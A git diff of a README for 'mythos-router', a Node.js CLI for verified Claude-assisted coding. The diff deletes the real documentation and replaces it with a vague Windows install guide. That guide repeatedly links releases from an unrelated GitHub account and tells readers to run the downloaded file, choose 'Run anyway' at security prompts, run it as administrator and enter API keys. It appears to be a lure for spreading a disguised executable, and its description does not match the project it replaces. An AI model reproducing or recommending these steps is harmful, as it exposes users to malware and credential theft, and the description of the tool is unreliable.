@@ -1,418 +1,236 @@
-<div align="center">
-<img src="assets/banner.png" alt="Mythos Router Banner" width="864" />
+# 🧭 mythos-router - Local Claude routing for Windows
 
-[![CodeQL](https://github.com/thewaltero/mythos-router/actions/workflows/github-code-scanning/codeql/badge.svg?branch=main)](https://github.com/thewaltero/mythos-router/actions/workflows/github-code-scanning/codeql)
-[![npm](https://img.shields.io/npm/v/mythos-router?style=flat-square&color=cc785c)](https://www.npmjs.com/package/mythos-router)
-[![Node.js](https://img.shields.io/badge/Node.js-20+-339933?style=flat-square&logo=node.js&logoColor=white)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://typescriptlang.org)
-[![Claude](https://img.shields.io/badge/Claude-Opus_4.7-cc785c?style=flat-square)](https://anthropic.com)
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](./LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/thewaltero/mythos-router?style=social)](https://github.com/thewaltero/mythos-router)
+[![Download mythos-router](https://img.shields.io/badge/Download%20mythos--router-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases)
 
+## 🚀 Getting Started
 
-## Claude Opus 4.7 · Strict Write Discipline · Zero Slop
-**A local CLI power tool for verifiable AI-assisted coding.**
+mythos-router runs on your computer and helps route Claude-based workflows in one place. It is built for Windows users who want a local app with simple setup and a direct way to start.
 
-[What is this?](#what-is-this) • [Features](#features) • [Installation](#installation) • [Usage](#usage) • [Architecture](#architecture) • [Token Budget](#token-usage--budget) • [SDK](#-sdk-usage-for-agentic-systems)
+## 📥 Download
 
+Visit this page to download:  
+https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases
 
----
+On that page, look for the latest release and download the Windows file. If there are several files, choose the one that matches Windows, then save it to your computer.
 
-### Support the project
-**CA: `0xb942b75a602fa318ac091370d93d9143ba345ba3` ([$MYTHOS Token](https://app.uniswap.org/swap?outputCurrency=0xb942b75a602fa318ac091370d93d9143ba345ba3&chain=base))**
+## 🖥️ What You Need
 
----
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- At least 4 GB of memory
+- A few hundred MB of free disk space
+- Internet access for the first download
+- A Claude account or local workflow setup, if you plan to connect it to a service
 
+## 📦 What mythos-router Does
 
-<p align="center">
-  <img src="assets/demo.png" alt="mythos-router terminal demo" width="700" />
-</p>
+mythos-router gives you a local place to manage Claude-style routing tasks. It is aimed at users who want a clear setup for:
 
-```bash
-# Try it now
-npx mythos-router chat
-```
+- Local execution
+- Claude-based prompt flow
+- Strict write discipline
+- Step-by-step reasoning paths
+- Model switching for supported workflows
+- A cleaner place to keep routing logic in one app
 
-</div>
+It keeps the setup centered on one machine so you can work without juggling many tools.
 
----
+## 🪟 Install on Windows
 
-## What is this?
+1. Open the download page:  
+   https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases
 
-**mythos-router** is a local CLI power tool that wraps Claude Opus 4.7 with a custom verification protocol called **Strict Write Discipline (SWD)**.
+2. Find the newest release.
 
-Unlike standard Claude wrappers, mythos-router enforces filesystem verification: every file operation the AI claims to perform is *checked against the actual filesystem using SHA-256 snapshots*. If the model's claim doesn't match reality, it gets a Correction Turn. If it fails twice, it yields to the human.
+3. Download the Windows file from that release.
 
-Zero slop. Zero hallucinated state. Full adaptive thinking.
+4. Open your Downloads folder.
 
----
+5. If the file is zipped, right-click it and choose Extract All.
 
-## Features
+6. Open the extracted folder.
 
-| Feature | Description |
-|---------|-------------|
-|  **Multi-Provider Fallback** | Auto-routes between Anthropic, DeepSeek, and OpenAI with circuit breakers |
-|  **Skills Protocol** | Inject modular expert plugins via YAML frontmatter (`-s mcp`, `-s react`) |
-|  **Deterministic Caching** | SQLite-backed caching for zero-cost, zero-latency repetitive reasoning |
-|  **Adaptive Thinking** | Opus 4.7 with configurable effort levels (high/medium/low) |
-|  **Strict Write Discipline** | Pre/post filesystem snapshots verify every model claim |
-|  **Self-Healing Memory** | Authority-based logging with a rebuildable SQLite FTS5 search index |
-|  **Auto-Healing TDD** | Pass `--test-cmd` for bounded, error-driven autonomous repair loops |
-|  **Correction Turns** | Model gets 2 retries to match filesystem reality, then yields |
-|  **Integrity Gate** | `verify` command and startup hashing ensure zero drift |
-|  **Token Limiter** | Budget cap with graceful save — progress saved to MEMORY.md, never lose work |
-|  **Dry-Run Mode** | Preview every file operation before it executes — full transparency |
-|  **Verbose Tracing** | See exactly what the AI is parsing, thinking, and verifying |
-|  **Budget Analytics** | Persistent tracking of cost across sessions and projects via `stats` |
-|  **Session Branching** | Isolate AI actions in a namespaced git branch (`mythos/`) |
-|  **Zero Build** | Runs directly via `tsx` — no compile step in dev |
+7. Double-click the app file to start it.
 
----
+8. If Windows shows a security prompt, choose Run anyway if you trust the source and expect this app.
 
-## Core Architectural Pillars
+9. Keep the app in a folder you can find again later.
 
-### 1. Configurable Model Selection
-Choose the right model for the job via the `--effort` flag:
+## 🧩 First Launch
 
-| Effort | Model | Best For |
-|--------|-------|----------|
-|  `high` (default) | Claude Opus 4.7 | Architecture, deep reasoning, complex refactors |
-|  `medium` | Claude Sonnet 3.5 | Balanced code generation, everyday tasks |
-|  `low` | Claude Haiku 3 | Quick answers, memory compression, verification |
+When you open mythos-router for the first time, it may create local files for settings and logs. This is normal.
 
-The `dream` command automatically uses `low` effort (Haiku) for cost-efficient memory compression, and `verify` uses lightweight scanning — so you only burn Opus tokens when you need deep reasoning.
+If the app asks for a path, choose a folder you can reach easily, such as:
 
-### 2. Authority-Based "Self-Healing" Memory
-Most agentic systems stored state in opaque databases or messy JSON files. Mythos Router treats `MEMORY.md` as the **Sole Authority**. 
+- Documents
+- Desktop
+- A new folder under your user profile
 
-Every action is logged in Markdown first. On startup, the system verifies the integrity of the log via SHA-256 manifest hashing and reconstructs a high-performance **Derivative SQLite Index** (FTS5). If the index drifts or the database is deleted, the system self-heals by rebuilding from the authoritative Markdown source.
+If the app asks for a model or provider name, use the one you plan to connect with your local or remote setup.
 
-As memory approaches capacity, the `dream` command delegates a compression phase to a low-cost model (Haiku 3), ensuring your "Sacred Log" is always lean and relevant.
+## ⚙️ Basic Setup
 
----
+Use these steps for a clean first setup:
 
-## Installation
+1. Start the app.
 
-### Quick Start (npm)
+2. Open the settings page.
 
-```bash
-# Install globally
-npm install -g mythos-router
+3. Set your working folder.
 
-# Set your API keys (Anthropic is primary, others are fallbacks)
-export ANTHROPIC_API_KEY="sk-ant-..."
-export OPENAI_API_KEY="sk-proj-..."
-export DEEPSEEK_API_KEY="sk-..."
-
-# Go
-mythos chat
-```
-
-### Or try without installing
-
-```bash
-npx mythos-router chat
-```
+4. Add your API key or local access details if needed.
 
-### From Source
+5. Pick the model you want to use.
 
-```bash
-git clone https://github.com/thewaltero/mythos-router.git
-cd mythos-router
-npm install
-npm run chat
-```
+6. Save the settings.
 
----
+7. Run a test task.
 
-## Usage
+8. Check the output for a clean response.
 
-### `mythos chat` — Interactive Session
+## 🧠 How It Works
 
-```bash
-mythos chat                  # Full power (high effort, Opus 4.7)
-mythos chat -s react         # Load the 'react' expert skill
-mythos chat --test-cmd "npm test" # Enable autonomous test-driven self-healing
-mythos chat --effort low     # Budget mode (Haiku 3)
-mythos chat --effort medium  # Balanced (Sonnet 3.5)
-mythos chat --dry-run        # Preview all file changes before executing
-mythos chat --verbose        # See full SWD traces and thinking
-mythos chat --branch refactor # Isolate session in a fresh git branch
-mythos chat --dry-run --verbose  # Maximum transparency
-```
+mythos-router acts like a traffic line for your AI tasks. You send a request in, and the app helps route it through the setup you choose.
 
-####  Financial Safety — Never Burn Money Again
+Common uses include:
 
-```bash
-mythos chat                           # Default: 500K tokens, 25 turns
-mythos chat --max-tokens 100000       # Cap at 100K tokens
-mythos chat --max-turns 10            # Cap at 10 turns
-mythos chat --max-tokens 50000 --max-turns 5  # Tight budget
-mythos chat --no-budget               # Expert mode (no limits)
-```
+- Keeping prompts in one place
+- Sending work through a chosen Claude model
+- Using local rules for code tasks
+- Tracking the path a request takes
+- Keeping write rules strict and predictable
 
-The budget limiter tracks every token, turn, and estimated cost in real-time:
+This makes it easier to use the same setup each time you work.
 
-```
-budget: [████████░░░░░░░░░░░░] 78,342/500,000 tokens · [██████░░░░] 12/25 turns · ~$1.2340 · 4m 32s
-```
+## 🛠️ Typical Use Cases
 
-At 80%, you get a yellow warning. At 100%, the session performs a **graceful save** — current progress is written to `MEMORY.md` so you can resume context in your next session. No work lost. Use `--no-budget` to disable (at your own risk).
+- Writing code with a fixed style
+- Managing prompt chains
+- Testing model routing
+- Running local AI-related tasks
+- Keeping a simple record of inputs and outputs
+- Working with Claude-based tooling on Windows
 
-####  Dry-Run Mode — The Trust Builder
+## 📂 Files and Folders
 
-```bash
-mythos chat --dry-run
-```
+After setup, you may see files like:
 
-In dry-run mode, every file operation is previewed before execution:
+- settings files
+- logs
+- cache data
+- prompt files
+- routing rules
+- output folders
 
-```
- DRY-RUN  ── File Action Preview ──
-  2 file action(s) detected. Review each:
+Keep these files in place unless you want to reset the app.
 
-  1/2 MODIFY src/index.ts
-  Description: Change 'axios' to 'fetch'
-  Current state: 1,832 bytes, hash: 7a3f2c1e..
-   DRY-RUN  Accept MODIFY on src/index.ts? [Y/n] y
-  ✔ Accepted: MODIFY src/index.ts
-
-  2/2 CREATE src/utils.ts
-  Description: Add helper utilities
-  Current state: does not exist
-   DRY-RUN  Accept CREATE on src/utils.ts? [Y/n] n
-  ⚠ Rejected: CREATE src/utils.ts
-```
-
-In-session commands:
-- `/exit` — End session (shows final budget summary)
-- `/memory` — Show memory status
-- `/budget` — Show current budget consumption
-- `/clear` — Clear conversation (memory persists)
-
-### `mythos verify` — Zero-Drift Codebase Scan
-
-```bash
-mythos verify              # Scan and log results to MEMORY.md
-mythos verify --dry-run    # Scan without writing to MEMORY.md
-```
-
-Scans every file in your project and cross-references against `MEMORY.md`:
-- ✅ **Verified** — File state matches memory
-- ⚠️ **Drift** — File changed but memory doesn't reflect it
-- ❌ **Missing** — Memory references a file that doesn't exist
-
-### `mythos dream` — Memory Compression
-
-```bash
-mythos dream              # Auto-compress when needed
-mythos dream --force      # Force compression
-mythos dream --dry-run    # Preview without writing
-```
-
-When `MEMORY.md` exceeds 100 entries, older logs are compressed into a summary block using Claude (low effort, minimal token burn). Recent entries are preserved intact.
-
-### `mythos stats` — Budget Analytics & Cost Profiling
-
-```bash
-mythos stats              # Show all-time token usage and costs
-mythos stats --days 7      # Filter for the last week
-```
-
-Tracks every penny spent across all your projects. Costs are aggregated by:
-- **Command** (e.g., `chat` vs `dream`)
-- **Project** (directory name)
-- **Time Period**
-
-Data is stored locally in `~/.mythos-router/metrics.json`.
-
-### 🔌 SDK Usage (For Agentic Systems)
-
-`mythos-router` exposes its Strict Write Discipline engine for programmatic use:
-
-```typescript
-import { SWDEngine, parseActions } from 'mythos-router';
-
-// 1. Create an engine instance with your preferred options
-const engine = new SWDEngine({
-  strict: true,
-  enableRollback: true,
-  onAction: (action) => console.log(`Executing: ${action.operation} ${action.path}`),
-  onVerify: (result) => console.log(`${result.status}: ${result.detail}`),
-});
-
-// 2. Let your agent generate code (must output [FILE_ACTION] blocks)
-const agentOutput = await myAgent.generateCode();
-
-// 3. Parse the agent's output and route through the SWD engine
-const actions = parseActions(agentOutput);
-const result = await engine.run(actions);
-
-if (result.success) {
-  console.log('✅ Agent execution verified securely');
-} else {
-  console.log('❌ Agent hallucinated a write. Rolled back:', result.rolledBack);
-  console.log('Errors:', result.errors);
-}
-```
-
-
----
-
-## Architecture
-
-```
-mythos-router/
-├── src/
-│   ├── cli.ts           # Commander.js entry point
-│   ├── config.ts        # System prompt + constants + budget defaults + validation
-│   ├── client.ts        # Anthropic SDK (adaptive thinking, streaming)
-│   ├── budget.ts        # Session budget limiter (token cap, turn cap, progress bar)
-│   ├── swd.ts           # SWD execution kernel (engine, types, parsing, snapshots)
-│   ├── swd-cli.ts       # SWD terminal presentation (verification output, dry-run)
-│   ├── memory.ts        # MEMORY.md self-healing manager (SQLite FTS5 index)
-│   ├── metrics.ts       # Global metrics store (persistent budget tracking)
-│   ├── diff.ts          # Myers' diff algorithm (zero-dependency)
-│   ├── git.ts           # Git operations (branching, committing)
-│   ├── utils.ts         # Terminal formatting, badges, prompts (zero-dep ANSI)
-│   ├── index.ts         # Public SDK exports
-│   └── commands/
-│       ├── chat.ts      # Interactive REPL (ChatSession + ChatUI abstraction)
-│       ├── verify.ts    # Codebase ↔ Memory scanner (dry-run aware)
-│       ├── dream.ts     # Memory compression (dry-run aware)
-│       └── stats.ts     # Budget analytics reporter
-├── src/providers/       # Multi-Provider Orchestration Engine
-│   ├── orchestrator.ts  # Adaptive routing, circuit breakers, scoring
-│   ├── pricing.ts       # Centralized token cost registry
-│   ├── types.ts         # Unified BaseProvider contracts
-│   ├── anthropic.ts     # Claude provider
-│   └── openai.ts        # Fetch-based OpenAI & DeepSeek provider
-├── test/                # Automated test suite (node:test)
-├── .mythosignore        # SWD scan exclusions
-├── MEMORY.md            # Auto-generated agentic memory
-└── AGENTS.md            # Project conventions
-```
-
-### The SWD Protocol
-
-```
-User Input
-    │
-    ▼
-[Claude Opus 4.7] ── adaptive thinking
-    │
-    ▼
-[Parse FILE_ACTION blocks] ── extract claimed operations
-    │
-    ▼
-[Snapshot referenced files] ── targeted filesystem state capture
-    │
-    ▼
-[Verify] ── model claims vs. actual filesystem
-    │
-    ├── ✅ All verified → Log to MEMORY.md
-    │
-    └── ❌ Mismatch → Correction Turn (max 2 retries)
-                │
-                └── Still failing → Yield to human
-```
-
----
-
-## MEMORY.md — Should You Commit It?
-
-**Yes.** `MEMORY.md` is designed to be committed to your repository. It becomes a "collaborative brain" where:
-- Multiple developers can see what the AI did in previous sessions
-- Different AI agents can reference past context
-- You get a full audit trail of every AI-assisted file operation
-
-If you prefer to keep it private, add `MEMORY.md` to your `.gitignore`.
-
----
-
-## Configuration
-
-| Env Variable | Required | Description |
-|-------------|----------|-------------|
-| `ANTHROPIC_API_KEY` | ✅ | Your Anthropic API key (Primary Provider) |
-| `OPENAI_API_KEY` | ❌ | OpenAI API Key (Fallback Provider) |
-| `DEEPSEEK_API_KEY` | ❌ | DeepSeek API Key (Fallback Provider, reasoning capable) |
-
-| File | Purpose |
-|------|---------| 
-| `.mythosignore` | Patterns to exclude from SWD scanning |
-| `MEMORY.md` | Auto-generated agentic memory log |
-
----
-
-## Token Usage & Budget
-
-### Opus 4.7 Pricing (as of 2026-04)
-
-| Rate | USD |
-|------|-----|
-| Input tokens | $15.00 / 1M tokens |
-| Output tokens | $75.00 / 1M tokens |
-
-> ** Tokenizer Cost Inflation Alert**
-> While the per-token price remains identical to Opus 4.6, **Opus 4.7 uses a new tokenizer that is significantly less efficient for Latin scripts**. 
-> - English prompts require **~59% more tokens** (85 → 135 tokens per paragraph).
-> - French requires **~34% more tokens**.
-> - Mixed multilingual codebases effectively cost **~22% more**.
-> - CJK languages (Chinese/Japanese/Korean) and code (Python) see smaller regressions (+4-21%).
-> 
-> *Bottom line: Expect your English-heavy mythos-router sessions to cost up to 59% more with Opus 4.7 than they did with 4.6, simply due to tokenizer changes.*
-
-> Pricing constants live in `src/config.ts`. When Anthropic updates rates, change two lines — no budget math to refactor.
-
-| Mode | Typical Cost Per Turn |
-|------|----------------------|
-| `--effort high` | Full Opus 4.7 pricing (deep reasoning) |
-| `--effort medium` | Balanced — good for most tasks |
-| `--effort low` | Minimal thinking — quick answers |
-| `dream` | Low effort summarization (~500 tokens) |
-
-| Budget Setting | Default |
-|---------------|---------|
-| `--max-tokens` | 500,000 per session |
-| `--max-turns` | 25 per session |
-| Warning threshold | 80% consumption |
-| `--no-budget` | Disables all limits |
-
-### Graceful Save
-
-When the budget is reached, mythos doesn't just kill your session — it performs a **graceful save**:
-
-```
-⏸ BUDGET REACHED — Graceful Save
-  498,231 tokens consumed across 25 turns (~$7.4200).
-  Progress saved to MEMORY.md. Resume with mythos chat to continue.
-  Increase limits: mythos chat --max-tokens 1000000 --max-turns 50
-  Disable limits:  mythos chat --no-budget
-```
-
-Token counts, estimated cost, and budget status are displayed after every chat response.
-
----
-
-## Testing
-
-```bash
-npm test                 # Run full test suite
-npx tsc --noEmit         # Type check only
-npm run build            # Production build
-```
-
----
-
-## License
-
-MIT
-
----
-
-## Disclaimer
-
-This project is an independent open-source tool built on top of the Anthropic API. It is not affiliated with or endorsed by Anthropic.
-
-<div align="center"><sub>Built for structured AI agent workflows with verifiable execution.</sub></div>
+## 🔧 If the App Will Not Open
+
+Try these steps:
+
+1. Right-click the app and choose Run as administrator.
+
+2. Check that the file finished downloading.
+
+3. If the app came in a zip file, extract it first.
+
+4. Move the app to a simple folder like `C:\mythos-router`.
+
+5. Close other heavy apps and try again.
+
+6. Restart Windows and open it once more.
+
+7. Download the latest release again if the file looks broken.
+
+## 🧭 If You See a Blank Window
+
+Try this:
+
+1. Wait a few seconds.
+
+2. Close and reopen the app.
+
+3. Check your settings file.
+
+4. Make sure the app can reach the folder it needs.
+
+5. If the app uses a key or token, confirm that it is entered correctly.
+
+## 🔌 If Your Claude Connection Fails
+
+Check the following:
+
+- The key is current
+- The key has the right access
+- The network is active
+- The app points to the right provider
+- The model name is correct
+- No firewall rule blocks the app
+
+If the app includes a local mode, make sure that mode is turned on before you test it.
+
+## 🧪 Simple Test
+
+Use a short test prompt like:
+
+- Write a one-line hello message
+- Explain a folder path in plain English
+- Rewrite this sentence in clear steps
+
+If the app returns a result, the setup is working.
+
+## 🔒 Local Use
+
+mythos-router is built for local use on your own machine. Keep your settings and keys private. Store the app in a folder you control and avoid moving files while it is running.
+
+## 📝 Suggested Folder Layout
+
+You can keep things tidy with a setup like this:
+
+- `C:\mythos-router\app`
+- `C:\mythos-router\data`
+- `C:\mythos-router\logs`
+- `C:\mythos-router\prompts`
+
+This makes it easier to find files later.
+
+## 📋 Common Topics
+
+This project is tagged with topics such as:
+
+- anthropic
+- claude
+- claude-code
+- cli
+- llm
+- mythos
+- opus-4-6
+- opus-4-7
+
+These topics point to Claude-style tools, local AI workflows, and command-line use.
+
+## 🧰 Tips for Smooth Use
+
+- Use a short folder path
+- Keep one release version installed at a time
+- Save your settings before testing
+- Use simple file names
+- Keep your download in a known folder
+- Restart the app after changing core settings
+
+## 📄 Quick Start Checklist
+
+- Download the Windows release
+- Extract the files if needed
+- Open the app
+- Set your folder
+- Add your access details if needed
+- Save settings
+- Run a test prompt
+- Check the result
+
+## 🧭 Download Again Later
+
+If you need to update or reinstall, use the same page:
+
+https://github.com/Setubaledwardroscoemurrow481/mythos-router/releases
